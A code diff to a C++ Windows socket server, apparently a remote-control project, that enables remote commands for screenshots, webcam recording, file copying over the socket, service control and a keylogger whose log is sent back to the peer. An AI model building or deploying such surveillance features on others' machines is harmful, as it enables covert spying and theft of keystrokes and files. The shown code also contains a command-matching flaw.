@@ -131,6 +131,7 @@
 //	return 0;
 //}
 
+// g++ Server.cpp service.cpp Utility.cpp -o main -lws2_32 -lole32 -lshell32 -luuid
 
 #include "stdafx.h"
 #include <winsock2.h>
@@ -139,12 +140,13 @@
 #include <fstream>
 #include <chrono>
 #include <thread>
-#include<atomic>
+#include <atomic>
 #include "Utility.h"
-// #include "service.cpp"
-#include<sstream>
+#include "service.cpp"
+#include <sstream>
 #include <locale>
 #include <codecvt>
+#include "WebcamRecorder.h"
 
 #pragma comment(lib, "Ws2_32.lib")
 
@@ -285,9 +287,14 @@ void sendFile(SOCKET clientSocket, const std::string& filePath) {
     std::cout << "File sent successfully. Total bytes sent: " << totalSent << std::endl;
 }
 
+// std::wstring stringToWstring(const std::string& str) {
+//     std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
+//     return converter.from_bytes(str);
+// }
+
 std::wstring stringToWstring(const std::string& str) {
-    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
-    return converter.from_bytes(str);
+    std::wstring wstr(str.begin(), str.end());
+    return wstr;
 }
 
 int main() {
@@ -365,6 +372,8 @@ int main() {
         char buffer[bufferSize];
         int byteCount;
         Computer computer;
+        ServiceManager service;
+        WebcamRecorder webcam("./");
         while (true) {
             // Nhận tin nhắn từ client
             byteCount = recv(serverSocket, buffer, bufferSize, 0);
@@ -393,25 +402,27 @@ int main() {
                 else if (v[0] == "STOPAPP") {
                     computer.stopApp(v[1]);
                 }
-                // else if (strcmp(buffer, "LISTSERVICE") == 0) {
-                //     //std::vector<ServiceManager::ServiceInfo> service = computer.listServices();
-                //     int a;
-
-                // }
-                // else if(v[0] == "STARTSERVICE") {
-                //     std::wstring ws = stringToWstring(v[1]);
-                //     bool ok = computer.startService(ws);
-                // }
-                // else if(strcmp(buffer, "STOPSERVICE") == 0) {
-                //     std::wstring ws = stringToWstring(v[1]);
-                //     computer.stopService(ws);
-                // }
-                //else if (strcmp(buffer, "SCREENSHOT") == 0) computer.screenShot();
-                // else if (v[0] == "COPYFILE") {
-                //     computer.copyFile(serverSocket, v[1]);
-                // }
-                //else if (strcmp(buffer, "STARTWEBCAME") == 0) computer.startWebcame();
-                //else if (strcmp(buffer, "STOPWEBCAME") == 0) computer.stopWebcame();
+                else if (strcmp(buffer, "LISTSERVICE") == 0) {
+                    // std::vector<ServiceManager::ServiceInfo> servicesList = service.listServices();
+                    // service.saveServicesToFile(servicesList, L"listServices.txt");
+                }
+                else if(v[0] == "STARTSERVICE") {
+                    std::wstring ws = stringToWstring(v[1]);
+                    bool ok = service.startService(ws);
+                }
+                else if(strcmp(buffer, "STOPSERVICE") == 0) {
+                    std::wstring ws = stringToWstring(v[1]);
+                    bool ok = service.stopService(ws);
+                }
+                else if (strcmp(buffer, "SCREENSHOT") == 0)
+                {
+                    webcam.screenShot("screenshot.png");
+                } 
+                else if (v[0] == "COPYFILE") {
+                    computer.copyFile(serverSocket, v[1]);
+                }
+                else if (strcmp(buffer, "STARTWEBCAME") == 0) webcam.startRecording();
+                else if (strcmp(buffer, "STOPWEBCAME") == 0) webcam.stopRecording();
                 else if (strcmp(buffer, "KEYLOGGER") == 0) {
                     computer.keyLogger(serverSocket);
                     computer.copyFile(serverSocket, "log.txt");
